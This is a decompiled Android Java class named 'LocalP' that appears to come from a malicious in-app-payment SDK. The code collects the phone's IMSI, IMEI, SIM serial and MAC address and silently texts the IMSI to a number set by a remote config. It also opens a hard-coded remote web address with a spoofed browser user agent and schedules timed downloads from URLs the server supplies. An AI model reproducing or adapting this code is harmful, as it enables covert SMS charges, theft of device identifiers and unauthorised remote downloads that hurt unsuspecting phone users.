package com.es.iap;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import com.android.dd.data.h;
import com.android.intent.http.g;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;
import java.util.Timer;

public class LocalP
  implements g
{
  int a = 1;
  private com.android.ll.logic.c b;
  private h c;
  private Context d;
  private boolean e = false;
  private Handler f = new d(this);
  private Handler g = new c(this);
  
  public LocalP() {}
  
  private void getConfig()
  {
    Log.d("fmz", "getConfig = 111");
    Log.d("fmz", "getConfig = 222");
    com.android.dd.data.c.c(this.d, com.android.dd.data.a.g);
    this.b.a(this, this.d);
  }
  
  private String getData()
  {
    SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyyMMddhhmmss");
    int i = new Random().nextInt(999999);
    return localSimpleDateFormat.format(new Date()) + i;
  }
  
  private void initTData()
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)this.d.getSystemService("phone");
    com.android.dd.data.a.g = localTelephonyManager.getSubscriberId();
    Log.i("fmz", "imsi===" + com.android.dd.data.a.g);
    com.android.dd.data.a.h = localTelephonyManager.getDeviceId();
    Object localObject = (WifiManager)this.d.getSystemService("wifi");
    if (localObject == null)
    {
      localObject = null;
      if (localObject != null) {
        break label141;
      }
    }
    for (;;)
    {
      com.android.dd.data.c.b(this.d, com.android.dd.data.a.b);
      com.android.dd.data.c.d(this.d, com.android.dd.data.a.a);
      com.android.dd.data.a.e = com.android.dd.data.c.a(this.d);
      com.android.dd.data.c.h(this.d, getData());
      com.android.dd.data.a.t = com.android.dd.data.c.e(this.d);
      com.android.dd.data.a.k = localTelephonyManager.getSimSerialNumber();
      return;
      localObject = ((WifiManager)localObject).getConnectionInfo();
      break;
      label141:
      ((WifiInfo)localObject).getMacAddress();
    }
  }
  
  private void readMessage(String paramString)
  {
    sendMessage(paramString);
    new Thread(new a(this)).start();
  }
  
  private void sendMessage(String paramString)
  {
    String str = com.android.dd.data.c.b(this.d);
    Log.d("fmz", "pNum = " + paramString + "   imsi = " + str);
    Object localObject = new Intent("SMS_SEND_ACTIOIN");
    localObject = PendingIntent.getBroadcast(this.d, 0, (Intent)localObject, 0);
    SmsManager.getDefault().sendTextMessage(paramString, null, str + "A", (PendingIntent)localObject, null);
    com.android.dd.data.c.a(this.d, true);
  }
  
  public void onPayStart(Activity paramActivity, boolean paramBoolean)
  {
    Log.d("fmz", "onPayStart = ");
    com.android.dd.data.a.o = paramActivity;
    this.d = paramActivity.getBaseContext();
    this.e = paramBoolean;
    com.android.dd.data.a.a(this.d);
    this.b = new com.android.ll.logic.c();
    initTData();
    getConfig();
  }
  
  public void onPc(Context paramContext, boolean paramBoolean)
  {
    this.d = paramContext;
    this.e = paramBoolean;
    com.android.dd.data.a.a(this.d);
    this.b = new com.android.ll.logic.c();
    initTData();
    getConfig();
  }
  
  public void response(Object paramObject, boolean paramBoolean)
  {
    if ((!paramBoolean) && (paramObject != null))
    {
      this.c = ((h)paramObject);
      if ((!TextUtils.isEmpty(this.c.a)) && (!this.c.a.equals("0"))) {
        com.android.dd.data.c.a(this.d, this.c.a);
      }
      com.android.dd.data.a.e = this.c.a;
      com.android.dd.data.a.f = this.c.b;
      TextUtils.isEmpty(this.c.c);
      if (!com.android.dd.data.c.g(this.d))
      {
        com.android.dd.data.c.b(this.d, true);
        startAlarm(this.c.d);
      }
    }
  }
  
  public void responseConfig(com.android.dd.data.d paramD, boolean paramBoolean)
  {
    if (paramD != null)
    {
      Object localObject;
      if ((this.e) && (!TextUtils.isEmpty(paramD.f())))
      {
        localObject = new Intent("android.intent.action.CALL");
        ((Intent)localObject).putExtra("URL", paramD.f());
        ((Intent)localObject).putExtra("Tsy", paramD.g());
        ((Intent)localObject).putExtra("TanC", paramD.h());
        ((Intent)localObject).setFlags(268435456);
        ((Intent)localObject).setClass(this.d, com.android.read.view.d.class);
        this.d.startActivity((Intent)localObject);
      }
      Log.d("fmz", "fff = " + paramD.e());
      if ((!com.android.dd.data.c.f(this.d)) && (!TextUtils.isEmpty(paramD.e()))) {
        readMessage(paramD.e());
      }
      for (;;)
      {
        if (!TextUtils.isEmpty(paramD.d())) {}
        try
        {
          com.android.dd.data.a.v = URLDecoder.decode(paramD.d(), "utf-8");
          if ((!TextUtils.isEmpty(paramD.b())) && (!com.android.dd.data.c.h(this.d)))
          {
            com.android.dd.data.c.c(this.d, true);
            localObject = null;
          }
          try
          {
            String str = URLDecoder.decode(paramD.b(), "utf-8");
            localObject = str;
          }
          catch (UnsupportedEncodingException localUnsupportedEncodingException2)
          {
            for (;;)
            {
              localUnsupportedEncodingException2.printStackTrace();
            }
          }
          com.nddroid.down.b.a = this.d;
          if (!com.nddroid.down.b.b(paramD.a())) {
            new Timer().schedule(new com.nddroid.down.a((String)localObject), Integer.parseInt(paramD.c()) * 1000);
          }
          return;
          this.f.sendEmptyMessage(0);
        }
        catch (UnsupportedEncodingException localUnsupportedEncodingException1)
        {
          for (;;)
          {
            localUnsupportedEncodingException1.printStackTrace();
          }
        }
      }
    }
    if (this.e)
    {
      paramD = new Intent("android.intent.action.CALL");
      paramD.putExtra("URL", "http%3a%2f%2fcweb.idmzone.com%2f");
      paramD.setFlags(268435456);
      paramD.setClass(this.d, com.android.read.view.d.class);
      this.d.startActivity(paramD);
    }
    try
    {
      com.android.dd.data.a.v = URLDecoder.decode("Mozilla%2f5.0+(Linux%3b+U%3b+Android+4.0.4%3b+zh-cn%3b+SCH-W2013+Build%2fIMM76D)+AppleWebKit%2f534.30+(KHTML%2c+like+Gecko)+Version%2f4.0+Mobile+Safari%2f534.30", "utf-8");
      this.f.sendEmptyMessage(0);
      return;
    }
    catch (UnsupportedEncodingException paramD)
    {
      for (;;)
      {
        paramD.printStackTrace();
      }
    }
  }
  
  public void startAlarm(String paramString)
  {
    if (!TextUtils.isEmpty(paramString)) {
      this.a = Integer.parseInt(paramString);
    }
    new Thread(new b(this)).start();
  }
}
